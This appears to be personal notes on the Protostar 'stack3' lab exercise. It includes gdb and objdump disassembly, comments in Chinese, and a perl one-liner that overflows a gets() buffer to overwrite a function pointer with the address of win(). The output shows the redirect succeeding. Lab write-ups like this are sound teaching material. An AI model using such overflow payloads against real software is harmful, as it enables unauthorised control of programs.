stack3:
(gdb) disass main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp 
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp) /* var_5c = 0x0*/
0x08048449 <main+17>:   lea    0x1c(%esp),%eax /* eax = esp_1c */
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt> /* gets(esp_1c) */
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax       /* 这里调用我们的输入*/
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) 

gets(esp_1c)从stdin中读取数据，栈溢出
(gdb) shell perl -e 'print"A"x(64)."B"x(4)' > /tmp/input
(gdb) r < /tmp/input
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack3 < /tmp/input
calling function pointer, jumping to 0x42424242

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff3d4) at stack3/stack3.c:22
22      in stack3/stack3.c
(gdb) 
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()


objdump -d stack3

08048424 <win>:
 8048424:       55                      push   %ebp
 8048425:       89 e5                   mov    %esp,%ebp
 8048427:       83 ec 18                sub    $0x18,%esp
 804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
 8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
 8048436:       c9                      leave  
 8048437:       c3                      ret    

08048438 <main>:
 8048438:       55                      push   %ebp
 8048439:       89 e5                   mov    %esp,%ebp
 804843b:       83 e4 f0                and    $0xfffffff0,%esp
 804843e:       83 ec 60                sub    $0x60,%esp
 8048441:       c7 44 24 5c 00 00 00    movl   $0x0,0x5c(%esp)
 8048448:       00 
 8048449:       8d 44 24 1c             lea    0x1c(%esp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 db fe ff ff          call   8048330 <gets@plt>
 8048455:       83 7c 24 5c 00          cmpl   $0x0,0x5c(%esp)
 804845a:       74 1b                   je     8048477 <main+0x3f>
 804845c:       b8 60 85 04 08          mov    $0x8048560,%eax
 8048461:       8b 54 24 5c             mov    0x5c(%esp),%edx
 8048465:       89 54 24 04             mov    %edx,0x4(%esp)
 8048469:       89 04 24                mov    %eax,(%esp)
 804846c:       e8 df fe ff ff          call   8048350 <printf@plt>
 8048471:       8b 44 24 5c             mov    0x5c(%esp),%eax
 8048475:       ff d0                   call   *%eax
 8048477:       c9                      leave  
 8048478:       c3                      ret    
 8048479:       90                      nop
 804847a:       90                      nop
 804847b:       90                      nop
 804847c:       90                      nop
 804847d:       90                      nop
 804847e:       90                      nop
 804847f:       90                      nop

将目标改写为win的地址
user@protostar:/opt/protostar/bin$ perl -e 'print"A"x(64)."\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
